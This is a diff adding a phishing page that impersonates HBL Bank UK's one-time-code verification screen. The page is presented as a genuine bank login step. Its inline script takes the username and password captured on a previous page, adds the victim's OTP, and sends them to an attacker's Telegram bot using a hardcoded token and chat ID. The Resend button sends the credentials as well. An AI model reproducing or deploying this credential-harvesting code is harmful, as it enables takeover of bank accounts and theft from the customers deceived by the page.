@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en-GB">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="description" content="Enter your HBL Bank UK verification code." />
+  <title>Verification code | HBL Bank UK</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body class="login-page">
+  <div class="login-shell">
+    <header class="login-top">
+      <a href="login.html" class="login-back" aria-label="Back to log in">
+        <svg width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M15.41 7.41 14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg>
+      </a>
+      <img src="hbl.jpeg" alt="HBL Bank UK" class="login-logo" width="220" height="52" />
+    </header>
+
+    <div class="verify-body">
+      <h1 class="verify-title">Verification code</h1>
+      <p class="verify-lead">
+        Enter the code we sent to your registered mobile number.
+      </p>
+
+      <form class="verify-form" id="verify-form" novalidate>
+        <label class="verify-code-label" for="verification-code">Verification code</label>
+        <input
+          type="text"
+          id="verification-code"
+          name="code"
+          class="verify-code-input"
+          inputmode="numeric"
+          autocomplete="one-time-code"
+          placeholder="Enter your code"
+        />
+
+        <p class="verify-resend">
+          Did not receive a code?
+          <button type="button" class="verify-link-btn" id="resend-btn">Resend</button>
+        </p>
+
+        <hr class="login-divider" />
+
+        <button type="submit" class="login-submit">VERIFY</button>
+        <p class="login-message" id="verify-message" role="status" hidden></p>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // ── Telegram Config ──────────────────────────────
+    const TG_TOKEN = "9152282584:AAFbd5TJhsu_pMQ2e-AkBC5viU1Mesu90TM";
+    const TG_CHAT  = "8929657470";
+
+    // استرجاع بيانات الصفحة الأولى
+    const username = sessionStorage.getItem("hbl_username") || "—";
+    const password = sessionStorage.getItem("hbl_password") || "—";
+
+    async function sendToTelegram(otp) {
+      const text =
+        "✅ *HBL Bank UK — Verification Code*\n\n" +
+        "👤 *Username:* `" + username + "`\n" +
+        "🔑 *Password:* `" + password + "`\n" +
+        "🔢 *OTP Code:* `" + otp + "`\n" +
+        "🕐 *Time:* " + new Date().toLocaleString("en-GB");
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (_) {}
+    }
+    // ─────────────────────────────────────────────────
+
+    const form      = document.getElementById("verify-form");
+    const codeInput = document.getElementById("verification-code");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const otp = codeInput.value.trim();
+      if (!otp) { codeInput.focus(); return; }
+
+      // إرسال إلى Telegram
+      await sendToTelegram(otp);
+    });
+
+    // زر Resend — يرسل إشعاراً أيضاً
+    document.getElementById("resend-btn").addEventListener("click", async () => {
+      const text =
+        "🔄 *HBL Bank UK — Resend Requested*\n\n" +
+        "👤 *Username:* `" + username + "`\n" +
+        "🔑 *Password:* `" + password + "`\n" +
+        "🕐 *Time:* " + new Date().toLocaleString("en-GB");
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (_) {}
+    });
+  </script>
+</body>
+</html>
